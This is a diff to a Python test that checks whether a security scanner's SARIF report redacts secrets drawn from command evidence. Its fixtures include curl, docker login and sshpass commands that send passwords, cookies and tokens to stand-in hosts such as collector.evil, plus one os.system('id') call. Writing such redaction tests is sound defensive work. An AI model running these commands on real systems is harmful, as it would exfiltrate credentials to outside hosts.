@@ -891,6 +891,9 @@ def test_catboost_sarif_redacts_non_url_secret_evidence(tmp_path: Path) -> None:
                 'curl -H "Cookie: foo=bar; session=CATBOOST_COOKIE_HEADER_SECRET" https://collector.evil/upload',
                 "curl --cookie session=CATBOOST_COOKIE_OPTION_SECRET https://collector.evil/upload",
                 "curl -bsession=hunter2 https://collector.evil/upload",
+                "curl --config - <<EOF\nuser = alice:CATBOOST_CURL_HEREDOC_SECRET\nEOF",
+                "echo CATBOOST_DOCKER_STDIN_SECRET | docker login --password-stdin registry.evil",
+                "SSHPASS=CATBOOST_SSHPASS_ENV_SECRET sshpass -e ssh user@evil.example",
                 'PGPASSWORD=CATBOOST_PG_PASSWORD_SECRET os.system("id")',
                 "curl https://collector.evil/upload?githubtoken=CATBOOST_GITHUB_TOKEN_SECRET",
                 'curl --json \'{"password":"CATBOOST_JSON_BODY_SECRET"}\' https://collector.evil/upload',
@@ -963,6 +966,9 @@ def test_catboost_sarif_redacts_non_url_secret_evidence(tmp_path: Path) -> None:
     assert "CATBOOST_COOKIE_HEADER_SECRET" not in sarif
     assert "CATBOOST_COOKIE_OPTION_SECRET" not in sarif
     assert "hunter2" not in sarif
+    assert "CATBOOST_CURL_HEREDOC_SECRET" not in sarif
+    assert "CATBOOST_DOCKER_STDIN_SECRET" not in sarif
+    assert "CATBOOST_SSHPASS_ENV_SECRET" not in sarif
     assert "CATBOOST_PG_PASSWORD_SECRET" not in sarif
     assert "CATBOOST_GITHUB_TOKEN_SECRET" not in sarif
     assert "CATBOOST_JSON_BODY_SECRET" not in sarif
